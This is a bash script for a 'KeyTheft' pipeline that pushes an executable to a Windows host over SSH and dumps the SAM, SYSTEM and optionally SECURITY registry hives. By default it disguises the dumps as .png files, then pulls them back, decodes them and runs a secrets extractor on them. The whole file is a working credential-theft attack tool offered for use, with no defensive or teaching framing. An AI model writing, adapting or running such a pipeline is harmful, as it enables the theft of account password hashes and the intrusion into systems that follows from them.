#!/usr/bin/env bash
# kt.sh - KeyTheft capture-to-secrets pipeline over SSH
# usage: kt.sh user@host [--sec] [--out DIR] [--skip-dump] [--pack none]
set -euo pipefail

KEY="${KT_SSH_KEY:-$HOME/.ssh/comrace_winvm}"
EXE="${KT_EXE:-$(dirname "$(readlink -f "$0")")/KeyTheft.exe}"
EXE="$(readlink -f "$EXE")"
PY="${KT_PY:-python3}"
OUT="kt-out"
SEC=0
SKIPDUMP=0
RAW=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --sec) SEC=1; shift ;;
        --out) OUT="$2"; shift 2 ;;
        --skip-dump) SKIPDUMP=1; shift ;;
        --pack) [[ "$2" == "none" ]] && RAW=1; shift 2 ;;
        *) TARGET="$1"; shift ;;
    esac
done

[[ -z "${TARGET:-}" ]] && { echo "usage: kt.sh user@host [--sec] [--out DIR] [--skip-dump] [--pack none]"; exit 3; }
SSH="ssh -i $KEY -o BatchMode=yes -o ConnectTimeout=10"
SCP="scp -q -i $KEY -o BatchMode=yes"
EXT="png"
[[ $RAW -eq 1 ]] && EXT="hiv"
HIVES="sam system"
[[ $SEC -eq 1 ]] && HIVES="$HIVES security"

mkdir -p "$OUT"
cd "$OUT"

if [[ $SKIPDUMP -eq 0 ]]; then
    echo "[*] pushing KeyTheft.exe to $TARGET"
    $SCP "$EXE" "$TARGET:KeyTheft.exe"

    echo "[*] dumping hives on $TARGET"
    HIVEARGS=""
    RAWFLAG=""
    for h in $HIVES; do HIVEARGS="$HIVEARGS $h.$EXT"; done
    [[ $RAW -eq 1 ]] && RAWFLAG=" --raw"
    $SSH "$TARGET" "KeyTheft.exe$RAWFLAG $HIVEARGS"
fi

echo "[*] pulling artifacts"
for h in $HIVES; do
    $SCP "$TARGET:$h.$EXT" .
done

if [[ $RAW -eq 1 ]]; then
    echo "[*] raw hives ready, skipping decode"
else
    for h in $HIVES; do
        K=$($SSH "$TARGET" "type $h.png.key" 2>/dev/null | tr -d '\r\n \0')
        [[ -z "$K" ]] && K=$(tr -d '\r\n \0' < "$h.png.key")
        echo "[*] decoding $h.png (key $K)"
        "$PY" "$(dirname "$EXE")/decode.py" "$K" "$h.png"
    done
fi

echo "[*] extracting secrets"
HIVARGS=""
for h in $HIVES; do HIVARGS="$HIVARGS $h.hiv"; done
"$PY" "$(dirname "$EXE")/sam_extract.py" $HIVARGS

echo "[+] artifacts in $OUT/"
